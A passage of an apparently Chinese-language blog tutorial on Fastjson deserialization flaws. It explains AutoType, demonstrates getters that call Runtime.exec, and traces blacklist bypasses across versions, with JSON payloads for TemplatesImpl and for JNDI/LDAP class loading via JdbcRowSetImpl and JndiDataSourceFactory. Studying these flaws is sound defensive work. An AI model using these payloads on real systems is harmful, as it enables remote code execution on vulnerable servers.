Big_Decimal price;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">toJSONString : &#123;<span class="string">&quot;fruit&quot;</span>:&#123;<span class="string">&quot;price&quot;</span>:<span class="number">0.5</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">toJSONString : &#123;<span class="string">&quot;fruit&quot;</span>:&#123;<span class="string">&quot;price&quot;</span>:<span class="number">500</span>&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Fastjson</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.name=<span class="string">&quot;james&quot;</span>;</span><br><span class="line">        <span class="built_in">this</span>.age=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String test)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name setter called&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name getter called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(String test)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;age setter called&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = test;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;age getter called&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Fastjson&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, age=&#x27;&quot;</span> + age + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">//ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">o</span> <span class="operator">=</span> JSON.toJSONString(<span class="keyword">new</span> <span class="title class_">Fastjson</span>());</span><br><span class="line">        System.out.println(o); <span class="comment">//class转为json</span></span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;------------&quot;</span>);</span><br><span class="line">        <span class="type">Fastjson</span> <span class="variable">obj</span> <span class="operator">=</span> (Fastjson) JSON.parse(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.fastjson.test.Fastjson\&quot;,\&quot;name\&quot;:\&quot;test name\&quot;, \&quot;age\&quot;:\&quot;test age\&quot;&#125;&quot;</span>);</span><br><span class="line">        System.out.println(obj); <span class="comment">//普通json对象转为object类</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">output:<span class="comment">//</span></span><br><span class="line">age getter called</span><br><span class="line">name getter called</span><br><span class="line">&#123;<span class="string">&quot;age&quot;</span>:<span class="string">&quot;18&quot;</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;james&quot;</span>&#125;</span><br><span class="line">------------</span><br><span class="line">name setter called</span><br><span class="line">age setter called</span><br><span class="line">Fastjson&#123;name=<span class="string">&#x27;test name&#x27;</span>, age=<span class="string">&#x27;test age&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">为了解决上述问题：</span><br><span class="line">fastjson引入了AutoType，即在序列化的时候，把原始类型记录下来。</span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;fruit&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.hollis.lab.fastjson.test.Apple&quot;</span>,</span><br><span class="line">        <span class="string">&quot;price&quot;</span>:<span class="number">0.5</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>fastjson 在反序列化的时候会去找我们在 <code>@type</code> 中规定的类是哪个类，然后在反序列化的时候会自动调用这些 setter 与 getter 方法的调用，注意！并不是所有的 setter 和 getter 方法。</p><p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter&#x2F;getter方法进行调用：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">满足条件的setter：</span><br><span class="line"></span><br><span class="line">- 非静态函数</span><br><span class="line">- 返回类型为void或当前类</span><br><span class="line">- 参数个数为1个</span><br><span class="line"></span><br><span class="line">满足条件的getter：</span><br><span class="line"></span><br><span class="line">- 非静态方法</span><br><span class="line">- 无参数</span><br><span class="line">- **返回值类型继承自Collection或Map或AtomicBoolean或AtomicInteger或AtomicLong**</span><br></pre></td></tr></table></figure><p>我个人理解 fastjson 的利用攻击其实是蛮简单的，因为没有那么多复杂的链子，也不需要反射修改值，直接在 json 串里面赋值就好了。</p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由前面知道，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者利用不同利用链来进行绕过利用而已。</p><p>通过Fastjson反序列化漏洞，攻击者可以传入一个恶意构造的JSON内容，程序对其进行反序列化后得到恶意类并执行了恶意类中的恶意函数，进而导致代码执行。</p><h2 id="那么如何才能够反序列化出恶意类呢？"><a href="#那么如何才能够反序列化出恶意类呢？" class="headerlink" title="那么如何才能够反序列化出恶意类呢？"></a>那么如何才能够反序列化出恶意类呢？</h2><ol><li><p>由前面demo知道，Fastjson使用<code>parseObject()</code>&#x2F;<code>parse()</code>进行反序列化的时候可以指定类型。如果指定的类型太大，包含太多子类，就有利用空间了。例如，如果指定类型为Object或JSONObject，则可以反序列化出来任意类。例如代码写<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。</p></li><li><p>如何才能触发反序列化得到的恶意类中的恶意函数呢?</p><p>由前面知道，在某些情况下进行反序列化时会将反序列化得到的类的构造函数、<code>getter</code>方法、<code>setter</code>方法执行一遍，如果这三种方法中存在危险操作，则可能导致反序列化漏洞的存在。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、<code>getter</code>方法、<code>setter</code>方法中要存在漏洞才能触发。</p></li></ol><p>我们到<code>DefaultJSONParser.parseObject(Map object, Object fieldName)</code>中看下，JSON中以@type形式传入的类的时候，调用<code>deserializer.deserialize()</code>处理该类，并去调用这个类的<code>setter</code>和<code>getter</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title function_">parseObject</span><span class="params">(<span class="keyword">final</span> Map object, Object fieldName)</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">// JSON.DEFAULT_TYPE_KEY即@type</span></span><br><span class="line">    <span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);</span><br><span class="line">        <span class="keyword">return</span> deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);</span><br></pre></td></tr></table></figure><p>整个解析过程相当复杂，知道结论就ok了。</p><h2 id="小结一下"><a href="#小结一下" class="headerlink" title="小结一下"></a>小结一下</h2><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、<code>setter</code>方法、<code>getter</code>方法存在危险操作，则存在Fastjson反序列化漏洞；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String test)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;name setter called&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name = test;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//弹出calc</span></span><br></pre></td></tr></table></figure><p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、<code>setter</code>方法、<code>getter</code>方法存在危险操作，则存在Fastjson反序列化漏洞；</p><h2 id="PoC-写法"><a href="#PoC-写法" class="headerlink" title="PoC 写法"></a>PoC 写法</h2><p>一般的，Fastjson反序列化漏洞的PoC写法如下，@type指定了反序列化得到的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;@type&quot;</span>:<span class="string">&quot;xxx.xxx.xxx&quot;</span>,</span><br><span class="line"><span class="string">&quot;xxx&quot;</span>:<span class="string">&quot;xxx&quot;</span>,</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键是要找出一个特殊的在目标环境中已存在的类，满足如下两个条件：</p><ol><li>该类的构造函数、<code>setter</code>方法、<code>getter</code>方法中的某一个存在危险操作，比如造成命令执行；</li><li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li></ol><h2 id="漏洞Demo"><a href="#漏洞Demo" class="headerlink" title="漏洞Demo"></a>漏洞Demo</h2><p>由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为<code>Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);</code>时，反序列化得到的类的构造函数、所有属性的<code>setter</code>方法、properties私有属性的<code>getter</code>方法都会被调用，因此我们这里直接做最简单的修改，将Student类中会被调用的<code>getter</code>方法添加漏洞代码，这里修改<code>getProperties()</code>作为演示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Properties;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Student</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> String name;  </span><br><span class="line"> <span class="keyword">private</span> <span class="type">int</span> age;  </span><br><span class="line"> <span class="keyword">private</span> String address;  </span><br><span class="line"> <span class="keyword">private</span> Properties properties;  </span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">Student</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;构造函数&quot;</span>);  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getName&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> name;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;setName&quot;</span>);  </span><br><span class="line"> <span class="built_in">this</span>.name = name;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAge&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> age;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">//    public void setAge(int age) &#123;  </span></span><br><span class="line"><span class="comment">//        System.out.println(&quot;setAge&quot;);  </span></span><br><span class="line"><span class="comment">//        this.age = age;  </span></span><br><span class="line"><span class="comment">//    &#125;  </span></span><br><span class="line">  </span><br><span class="line"> <span class="keyword">public</span> String <span class="title function_">getAddress</span><span class="params">()</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getAddress&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> address;  </span><br><span class="line"> &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProperties</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;getProperties&quot;</span>);  </span><br><span class="line"> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line"> <span class="keyword">return</span> properties;  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>FastjsonEasyPoC.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.Feature;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastjsonEasyPoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Student\&quot;,\&quot;age\&quot;:6,\&quot;name\&quot;:\&quot;Drunkbaby\&quot;,\&quot;address\&quot;:\&quot;china\&quot;,\&quot;properties\&quot;:&#123;&#125;&#125;&quot;</span>;  </span><br><span class="line">  </span><br><span class="line"> <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(jsonString, Object.class);  </span><br><span class="line"> System.out.println(obj);  </span><br><span class="line"> System.out.println(obj.getClass().getName());  </span><br><span class="line"> &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。</p><p>对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景：</p><h2 id="漏洞攻防史"><a href="#漏洞攻防史" class="headerlink" title="漏洞攻防史"></a>漏洞攻防史</h2><ol><li><p>v1.2.24之前</p><p>@type自动加载类</p></li><li><p>v1.2.41之前，</p></li></ol><p>  fastjson默认关闭了autotype支持，并且加入了checkAutotype （过滤@type里的值，黑白名单过滤）</p><p>  加载的过程中，fastjson有一段特殊的处理，那就是在具体加载类的时候会去掉className前后的L和后面的分号;，形如Lcom.lang.Thread;    Lcom.sun.rowset.JdbcRowSetImpl;</p><ol start="3"><li><p>v1.2.42</p><p>在进行黑白名单检测的时候，fastjson先判断目标类的类名的前后是不是L和;，如果是的话，就截取掉前后的L和;再进行黑白名单的校验 LLcom.sun.rowset.JdbcRowSetImpl;; </p></li><li><p>v1.2.43</p><p>fastjson这次在黑白名单判断之前，增加了一个是否以LL未开头的判断 在目标类前面添加[ v1.2.44版本中，fastjson的作者做了更加严格的要求，只要目标类以[开头或者以;结尾 </p></li><li><p>v1.2.47 </p><p>autoType不开启反而会被攻击。因为在fastjson中有一个全局缓存，在类加载的时候，如果autotype没开启，会先尝试从缓存中获取类，如果缓存中有，则直接返回。java.lang.Class类对应的deserializer为MiscCodec，反序列化时会取json串中的val值并加载这个val对应的类。如果fastjson cache为true，就会缓存这个val对应的class到全局缓存中</p></li><li><p>v1.2.68</p><p>利用异常进行攻击       OOM在fastjson中， 如果@type 指定的类为 Throwable 的子类，那对应的反序列化处理类就会使用到 ThrowableDeserializer而在ThrowableDeserializer#deserialze的方法中，当有一个字段的key也是 @type时，就会把这个 value 当做类名，然后进行一次 checkAutoType 检测。并且指定了expectClass为Throwable.class，但是在checkAutoType中，有这样一约定，那就是如果指定了expectClass ，那么也会通过校验。因为fastjson在反序列化的时候会尝试执行里面的getter方法，而Exception类中都有一个getMessage方法。只需要自定义一个异常，并且重写其getMessage就达到了攻击的目的。</p></li></ol><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h4 id="fastjson1-2-24"><a href="#fastjson1-2-24" class="headerlink" title="fastjson1.2.24"></a>fastjson1.2.24</h4><h6 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h6><ol><li><p>漏洞利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.构造一个 TemplatesImpl 类的反序列化字符串，其中 _bytecodes 是我们构造的恶意类的类字节码，这个类的父类是 AbstractTranslet，最终这个类会被加载并使用 newInstance() 实例化。</span><br><span class="line"></span><br><span class="line">2.在反序列化过程中，由于getter方法 getOutputProperties()，满足条件，将会被 fastjson 调用，而这个方法触发了整个漏洞利用流程：getOutputProperties() </span><br><span class="line">-&gt; newTransformer()</span><br><span class="line">-&gt; getTransletInstance() </span><br><span class="line">-&gt; defineTransletClasses() / EvilClass.newInstance().</span><br></pre></td></tr></table></figure></li><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;yv66vgAAADQA...CJAAk=&quot;</span>],</span><br><span class="line">    <span class="string">&quot;_name&quot;</span>: <span class="string">&quot;su18&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_tfactory&quot;</span>: &#123;&#125;,</span><br><span class="line">    <span class="string">&quot;_outputProperties&quot;</span>: &#123;&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Fastjson24poc</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//TemplatesImpl</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">byteCode</span> <span class="operator">=</span> <span class="string">&quot;xxxxxxxxxxxxxxx&quot;</span>;</span><br><span class="line">        <span class="comment">//构造TemplatesImpl的json数据，并将恶意类注入到json数据中</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">NASTY_CLASS</span> <span class="operator">=</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+byteCode+<span class="string">&quot;\&quot;],&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_name&#x27;:&#x27;TempletaPoc&#x27;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;_tfactory&#x27;:&#123;&#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_outputProperties\&quot;:&#123;&#125;&#125;\n&quot;</span>;</span><br><span class="line">        System.out.println(payload);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> JSON.parseObject(payload, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220828220330214.png" alt="image-20220828220330214"></p></li></ol><h6 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h6><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-25"><a href="#fastjson1-2-25" class="headerlink" title="fastjson1.2.25"></a>fastjson1.2.25</h4><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-42"><a href="#fastjson1-2-42" class="headerlink" title="fastjson1.2.42"></a>fastjson1.2.42</h4><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-43"><a href="#fastjson1-2-43" class="headerlink" title="fastjson1.2.43"></a>fastjson1.2.43</h4><ol><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>[,</span><br><span class="line">    &#123;<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span>,</span><br><span class="line">    <span class="string">&quot;autoCommit&quot;</span>:<span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-44"><a href="#fastjson1-2-44" class="headerlink" title="fastjson1.2.44"></a>fastjson1.2.44</h4><ol><li>这个版本主要是修复上一个版本中使用 <code>[</code> 绕过黑名单防护的问题</li></ol><h4 id="fastjson1-2-45"><a href="#fastjson1-2-45" class="headerlink" title="fastjson1.2.45"></a>fastjson1.2.45</h4><ol><li><p>黑名单绕过</p></li><li><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;properties&quot;</span>:&#123;</span><br><span class="line">        <span class="string">&quot;data_source&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="fastjson1-2-47"><a 